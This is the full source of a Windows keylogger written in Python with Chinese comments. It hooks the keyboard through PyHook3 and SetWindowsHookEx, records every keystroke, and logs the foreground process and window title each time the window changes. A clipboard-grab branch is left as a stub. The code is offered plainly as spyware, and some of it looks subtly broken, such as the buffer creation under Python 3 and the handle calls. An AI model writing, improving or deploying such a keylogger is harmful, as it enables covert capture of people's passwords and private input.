######################################################################
# 程序名：keylogger.py
# 功能：利用Python第三方库PyHook实现键盘记录
# 说明：运行平台Windows。它利用Windows的SetWindowsHookEx函数注册了一个
#		自定义的钩子函数，通过函数就能截获用户的按键信息
######################################################################
from ctypes import *
import pythoncom
import PyHook3 as pyHook
#import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()  # 获得前台窗口句柄
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value  # 将进程ID存入变量中

    # 申请内存
    executable = create_string_buffer("\x00" * 1024)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)  # 获得进程名

    # 读取窗口标题
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)  # 获得窗口名

    # 打印
    print()
    print("[PID: %s-%s-%s]" % (process_id, executable.value, window_title.value))
    print()

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


# 定义击键监听事件函数
def key_event(event):
    global current_window
    if event.WindowName != current_window:  # 检查目标是否切换了窗口
        current_window = event.WindowName
        get_current_process()

    if event.Ascii > 32 and event.Ascii < 127:  # 检查是否为常规按键
        print(chr(event.Ascii), end=' ')

    else:
        if event.Key == "V":  # 如果是CTRL+V，则获取剪贴板内容
            pass
        else:
            print("[%s]" % event.Key, end=' ')
    # 循环监听下一个敲键事件
    return True  # 返回到下一个钩子事件


def key_logger():
    hooker = pyHook.HookManager()  # 创建构造函数管理器
    hooker.KeyDown = key_event  # 注册钩子按键事件的处理函数
    hooker.HookKeyboard()  # 创建键盘钩子
    pythoncom.PumpMessages()  # 执行


if __name__ == "__main__":
    key_logger()

########################################################################
